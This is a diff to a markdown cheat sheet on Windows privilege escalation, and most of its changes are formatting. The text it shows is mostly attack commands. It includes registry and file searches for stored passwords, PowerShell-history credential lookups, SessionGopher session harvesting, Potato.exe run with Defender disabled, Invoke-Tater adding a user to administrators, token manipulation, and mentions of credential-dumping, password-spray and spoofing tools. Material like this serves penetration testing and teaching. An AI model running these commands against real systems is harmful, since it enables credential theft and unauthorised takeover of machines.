@@ -35,18 +35,17 @@ OS name, arch, and version
 
 ```bat
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+
 wmic os get lastbootuptime
 wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
 
 hostname
-
 C:\WINDOWS\System32\drivers\etc\hosts
 ```
 
 List all env variables
 
 ```bat
-set
 Get-ChildItem Env: | ft Key,Value
 ```
 
@@ -55,6 +54,7 @@ List all drives
 ```bat
 wmic logicaldisk get caption || fsutil fsinfo drives
 wmic logicaldisk get caption,description,providername
+
 Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
 ```
 
@@ -105,6 +105,7 @@ List all local groups
 
 ```bat
 net localgroup
+
 Get-LocalGroup | ft Name
 ```
 
@@ -112,6 +113,7 @@ Get details about a group \(i.e. administrators\)
 
 ```bat
 net localgroup administrators
+
 Get-LocalGroupMember Administrators | ft Name, PrincipalSource
 Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource
 ```
@@ -124,6 +126,7 @@ List all network interfaces, IP, and DNS.
 
 ```bat
 ipconfig /all
+
 Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
 Get-DnsClientServerAddress -AddressFamily IPv4 | ft
 ```
@@ -132,6 +135,7 @@ List current routing table
 
 ```bat
 route print
+
 Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
 ```
 
@@ -139,6 +143,7 @@ List the ARP table
 
 ```bat
 arp -A
+
 Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
 ```
 
@@ -224,15 +229,16 @@ DataSources\DataSources.xml
 ### Unattended Install files
 
 ```bat
+dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
+
+Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
+
 C:\Windows\Panther\Unattend.xml
 C:\Windows\Panther\Unattended.xml
 C:\Windows\Panther\Unattend\Unattended.xml
 C:\Windows\Panther\Unattend\Unattend.xml
 C:\Windows\System32\Sysprep\unattend.xml 
 C:\Windows\System32\Sysprep\Panther\unattend.xml
-
-dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
-Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
 ```
 
 ### Credential manager
@@ -262,11 +268,9 @@ Get-ChildItem C:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction Sil
 cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
 findstr /si password *.xml *.ini *.txt *.config 2>nul
 findstr /spin "password" *.* 2>nul
-
 dir /s *pass* == *vnc* == *.config* 2>nul (lot of output)
 
 Get-Childitem –Path C:\Users\ -Include *password*,*vnc*,*.config -File -Recurse -ErrorAction SilentlyContinue
-
 Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
 
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
@@ -278,6 +282,8 @@ C:\inetpub\wwwroot\web.config
 ```bat
 REG QUERY HKLM /F "password" /t REG_SZ /S /K
 REG QUERY HKCU /F "password" /t REG_SZ /S /K
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
 
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
@@ -286,8 +292,6 @@ reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy cr
 reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
 reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
 
-reg query HKLM /f password /t REG_SZ /s
-reg query HKCU /f password /t REG_SZ /s
 
 REG QUERY "HKLM\Software\Microsoft\FTH" /V RuleList
 
@@ -298,10 +302,11 @@ Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows 
 
 ```bat
 https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
-Import-Module path\to\SessionGopher.ps1;
+Import-Module <full_path>\SessionGopher.ps1;
 Invoke-SessionGopher -AllDomain -o
 Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
 ```
+> Full path is mandatory for Import-Module
 
 ### in Powershell history
 
@@ -309,6 +314,7 @@ Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
 cat (Get-PSReadlineOption).HistorySavePath
 cat (Get-PSReadlineOption).HistorySavePath | sls passw
 ```
@@ -483,6 +489,7 @@ GENEROC_ALL (inherits SERVICE_CHANGE_CONFIG)
 - msf
 post/windows/gather/enum_patches
 
+- https://github.com/rasta-mouse/Watson
 - https://github.com/rasta-mouse/Sherlock
 Find-AllVulns
 
@@ -524,19 +531,15 @@ https://github.com/itm4n/FullPowers
 
 ### Hot potato
 
-[https://foxglovesecurity.com/2016/01/16/hot-potato/](https://foxglovesecurity.com/2016/01/16/hot-potato/)
+- [https://foxglovesecurity.com/2016/01/16/hot-potato/](https://foxglovesecurity.com/2016/01/16/hot-potato/)
 
-* exe
-
-[https://github.com/foxglovesec/Potato](https://github.com/foxglovesec/Potato)
+exe : [Potato.exe](https://github.com/foxglovesec/Potato)
 
 ```bat
   Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true
 ```
 
-* powershell 
-
-[https://github.com/Kevin-Robertson/Tater](https://github.com/Kevin-Robertson/Tater)
+powershell : [Tater.ps1](https://github.com/Kevin-Robertson/Tater)
 
 ```bat
 Invoke-Tater -Command "net localgroup administrators user /add"
@@ -574,7 +577,8 @@ Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -n
 
 **abusing the golden privileges**
 
-[https://github.com/ohpe/juicy-potato/releases](https://github.com/ohpe/juicy-potato/releases) Juicy Potato doesn't work on Windows Server 2019 and Windows 10 1809 +.
+[releases](https://github.com/ohpe/juicy-potato/releases) 
+> Juicy Potato doesn't work on Windows Server 2019 and Windows 10 1809 +.
 
 ```bat
 Check the privileges of the service account, you should look for SeImpersonate and/or SeAssignPrimaryToken (Impersonate a client after authentication)
@@ -640,9 +644,9 @@ icacls C:\Perl64
 
 ## **Vulnerable Drivers**
 
-```bat
-https://github.com/matterpreter/OffensiveCSharp/tree/master/DriverQuery
+- [DriverQuery](https://github.com/matterpreter/OffensiveCSharp/tree/master/DriverQuery)
 
+```bat
 driverquery
 driverquery.exe /fo table
 DriverQuery.exe --no-msft
@@ -678,5 +682,7 @@ Send data throught the named pipe : program.exe >\\.\pipe\StdOutPipe 2>\\.\pipe\
 
 ## **To check**
 
-Invoke-WCMDump -- Extracts crendentials from Credential Manager. Detected. DomainPasswordSpray -- Spray gathered passwords across domain Inveigh -- Inveigh is a PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer and man-in-the-middle tool.
+- Invoke-WCMDump -- Extracts crendentials from Credential Manager. Detected. 
+- DomainPasswordSpray -- Spray gathered passwords across domain Inveigh -- 
+- Inveigh is a PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer and man-in-the-middle tool.
 
